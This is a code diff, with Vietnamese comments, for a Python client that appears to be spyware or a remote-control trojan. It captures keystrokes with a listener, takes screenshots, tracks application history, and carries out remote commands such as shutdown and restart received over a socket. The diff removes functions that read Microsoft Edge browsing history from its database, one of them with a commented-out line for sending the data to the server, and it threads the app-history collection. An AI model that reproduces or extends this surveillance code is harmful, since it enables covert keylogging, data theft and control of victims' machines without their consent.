@@ -1,4 +1,5 @@
 import sqlite3
+import threading
 from pynput.keyboard import Listener
 import socket
 import pyautogui
@@ -111,64 +112,12 @@ def getAppHistory():
         # Chờ 1 giây trước khi lặp lại để tránh tải nhiều tài nguyên hệ thống
         time.sleep(1)
 
-def get_edge_history():
-    while True:
-        
-        # Đường dẫn đến cơ sở dữ liệu lịch sử của Microsoft Edge
-        data_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
 
-
-        # Kết nối đến cơ sở dữ liệu lịch sử
-        try:
-            connection = sqlite3.connect(data_path)
-            cursor = connection.cursor()
-
-            # Thực hiện truy vấn để lấy dữ liệu lịch sử
-            cursor.execute('SELECT * FROM urls')
-            history = cursor.fetchall()
-
-            for row in history:
-                url, title, last_visit_time = row
-                print(f"{last_visit_time}: {title} - {url}")
-
-                # clientSocket.send(web.encode('utf-8'))
-            cursor.close()
-            connection.close()      
-            time.sleep(5)
-
-        except sqlite3.OperationalError as e:
-            print(e)
-def get_browsing_history():
-    while True:
-        
-        db_path = os.path.expanduser('~') + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
-        # db_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default'
-
-
-        # Kết nối đến cơ sở dữ liệu SQLite
-        connection = sqlite3.connect(db_path)
-        cursor = connection.cursor()
-
-        # Truy vấn để lấy lịch sử truy cập web
-        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
-        results = cursor.fetchall()
-
-        # In lịch sử truy cập web
-        print("Browsing History:")
-        for row in results:
-            url, title, last_visit_time = row
-            print(f"{last_visit_time}: {title} - {url}")
-
-        # Đóng kết nối
-        cursor.close()
-        connection.close()
-
-        # Chờ 5 giây trước khi lấy dữ liệu tiếp theo
-        time.sleep(5)
            
 with Listener(on_press=on_press) as parent:
     try:
-        getAppHistory()
+        appHistory_thread = threading.Thread(target=getAppHistory)
+        appHistory_thread.start()
         while True:
             message = clientSocket.recv(1024).decode('utf-8')
             print("Message:" + message)
@@ -176,8 +125,8 @@ with Listener(on_press=on_press) as parent:
                 takeScreenshot()
             # elif message == 'appHistory':
                 # getAppHistory()
-            elif message == 'webHistory':
-                get_edge_history()    
+            # elif message == 'webHistory':
+                # get_edge_history()    
             elif message == 'shutdown':
                 os.system("shutdown /s /t 1")
             elif message == 'restart':
